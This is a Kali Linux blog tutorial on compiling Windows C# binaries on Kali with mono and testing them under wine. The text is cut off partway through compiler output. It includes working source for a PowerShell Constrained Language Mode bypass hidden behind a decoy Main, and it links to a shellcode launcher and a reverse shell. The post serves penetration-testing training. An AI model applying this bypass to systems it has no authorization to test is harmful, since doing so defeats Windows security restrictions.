---
title: Building Windows C# Tools and Payloads from Kali Linux
url: https://www.kali.org/blog/windows-csharp-payloads/
source: Over Security
date: 2026-11-04
fetch_date: 2026-11-05T08:44:53.083234
---

# Building Windows C# Tools and Payloads from Kali Linux

* [Join Free CTF](https://www.offsec.com/events/the-gauntlet/?utm_source=kali&utm_medium=web&utm_campaign=menu)
* [Get Kali](https://www.kali.org/get-kali/)
* [Blog](https://www.kali.org/blog/)
* Documentation

  [Documentation Pages](https://www.kali.org/docs/)
  [Tools Documentation](https://www.kali.org/tools/)
  [Frequently Asked Questions](https://www.kali.org/faq/)
  [Known Issues](https://bugs.kali.org/search.php?project_id=1&category_id[]=General%20Bug&category_id[]=Kali%20Package%20Bug&category_id[]=Kali%20Package%20Improvement&status[]=30&status[]=40&status[]=50&sticky=on&sort=id%2Clast_updated&dir=DESC%2CDESC&hide_status=-2&match_type=0)
* Community

  [Community Support](https://www.kali.org/community/)
  [Forums](https://forums.kali.org/)
  [Discord](https://discord.kali.org/)
  [Join Newsletter](https://www.kali.org/newsletter/)
  [Mirror Location](https://http.kali.org/README?mirrorlist)
  [Get Involved](https://www.kali.org/docs/community/contribute/)
* [Courses](https://www.offsec.com/kali-training/courses/?utm_source=kali&utm_medium=web&utm_campaign=menu)
* Developers

  [Git Repositories](https://gitlab.com/kalilinux)
  [Packages](https://pkg.kali.org/)
  [Auto Package Test](https://autopkgtest.kali.org/)
  [Bug Tracker](https://bugs.kali.org/)
  [Kali NetHunter Stats](https://nethunter.kali.org/)
* About

  [Kali Linux Overview](https://www.kali.org/features/)
  [Press Pack](https://gitlab.com/kalilinux/documentation/press-pack/-/archive/main/press-pack-main.zip)
  [Wallpapers](https://www.kali.org/wallpapers/)
  [Kali Swag Store](https://offsec.usa.dowlis.com/kali/view-all.html)
  [Meet The Kali Team](https://www.kali.org/about-us/)
  [Partnerships](https://www.kali.org/partnerships/)
  [Contact Us](https://www.kali.org/contact/)

LIGHT
[ ] DARK

![](https://www.kali.org/blog/windows-csharp-payloads/images/banner-csharp-kali.jpg)
Wednesday, 04 November 2026

# Building Windows C# Tools and Payloads from Kali Linux

Table of Contents

* [Compiling C# code in Kali](#compiling-c-code-in-kali)
  + [How to run these binaries from Kali Linux](#how-to-run-these-binaries-from-kali-linux)
  + [Constrained Language Mode Bypass](#constrained-language-mode-bypass)
* [Caesar Cipher](#caesar-cipher)
* [Rubeus](#rubeus)
* [DotNetToJScript](#dotnettojscript)

One of our team members recently took (and passed!) **OffSec**’s advanced penetration testing course & exam, **[PEN-300/OSEP](https://www.offsec.com/courses/pen-300/?utm_source=kali&utm_medium=web&utm_campaign=blog)**. Whilst it focuses a lot on Microsoft Windows, there were a few **extra places where Linux could be used to complete the same task**… just quicker!

[![](images/pen-300-banner.png)](https://www.offsec.com/courses/pen-300/?utm_source=kali&utm_medium=web&utm_campaign=blog)

## Compiling C# code in Kali

In general, what you need for compiling **CSharp** (C#) code in Kali is [`mono-devel`](https://pkg.kali.org/pkg/mono):

```
kali@kali:~$ sudo apt install mono-devel
```

---

Now we need some code to compile. Here’s a very basic way of executing a program (process):

```
using System;
using System.Diagnostics;

namespace Exec
{
    class Program
    {
        static void Main()
        {
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("cmd.exe", "/T:09 /K systeminfo");
            procInfo.CreateNoWindow = false;
            procInfo.UseShellExecute = false;

            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

If you would like some more examples to get you going, try a [Shellcode Launcher](https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs) or a [Simple Reverse Shell](https://gist.github.com/zhsh9/0bad6099be3b2f843912e423999c8292).

---

All that is left is to compile:

```
kali@kali:~$ TERM=linux mcs -out:exec.exe exec.cs
kali@kali:~$
kali@kali:~$ file exec.*
exec.cs:  C++ source, ASCII text
exec.exe: PE32 executable for MS Windows 4.00 (console), Intel i386 Mono/.Net assembly, 3 sections
kali@kali:~$
```

### How to run these binaries from Kali Linux

Simple: just **install [wine](https://pkg.kali.org/pkg/wine) and [wine-mono](https://github.com/wine-mono/wine-mono/releases/latest)**. It’s really handy, as you can test your Windows binaries (even reverse shells) directly from Kali:

```
kali@kali:~$ sudo dpkg --add-architecture i386
kali@kali:~$ sudo apt update
[...]
kali@kali:~$ sudo apt -y install wine32
[...]
kali@kali:~$

# Install wine-mono
kali@kali:~$ wget https://dl.winehq.org/wine/wine-mono/11.3.0/wine-mono-11.3.0-x86.msi
[...]
kali@kali:~$
kali@kali:~$ wine msiexec /i wine-mono-11.3.0-x86.msi
[...]
kali@kali:~$
```

---

And now, to run your freshly built `.exe` binary, just use:

```
kali@kali:~$ wine exec.exe
```

[![](images/running-windows-binaries.png)](https://www.kali.org/blog/windows-csharp-payloads/images/running-windows-binaries.png)

### Constrained Language Mode Bypass

It’s not always that easy — sometimes things get a bit trickier. For example, for compiling the Constrained Language Mode (CLM) bypass section, we need some DLL libraries from Microsoft: `System.Management.Automation.dll` and `System.Configuration.Install.dll`:

Good news! [Powershell Empire](https://www.kali.org/tools/powershell-empire/) already includes them; you just have to install the package and run it so that it downloads all the required files for you:

```
kali@kali:~$ sudo apt install powershell-empire
[...]
# Configure powershell-empire (downloads required DLL files for CSharp)
kali@kali:~$ powershell-empire server
[...]
```

Let’s find the needed DLL(s):

```
kali@kali:~$ sudo updatedb
kali@kali:~$ locate System.Management.Automation.dll
/home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v1.0.0/EmpireCompiler/Data/AssemblyReferences/net35/System.Management.Automation.dll
/home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v1.0.0/EmpireCompiler/Data/AssemblyReferences/net40/System.Management.Automation.dll
[...]
kali@kali:~$ locate System.Configuration.Install.dll
/home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v1.0.0/EmpireCompiler/Data/AssemblyReferences/net35/System.Configuration.Install.dll
/home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v1.0.0/EmpireCompiler/Data/AssemblyReferences/net40/System.Configuration.Install.dll
/home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-v1.0.0/EmpireCompiler/Data/AssemblyReferences/net45/System.Configuration.Install.dll
```

Now we are ready to compile our CLM bypass:

```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```

```
kali@kali:~$ TERM=linux mcs \
  -target:library \
  -out:bypass.dll bypass.cs \
  -r:$(echo /home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-*/EmpireCompiler/Data/AssemblyReferences/net40/System.Management.Automation.dll) \
  -r:$(echo /home/kali/.local/share/empire/empire-compiler/EmpireCompiler-linux-x64-*/EmpireCompiler/Data/AssemblyReferences/net40/System.Configuration.Install.dll)
kali@kali:~$ file bypass.dll
bypass.dll: PE32 e...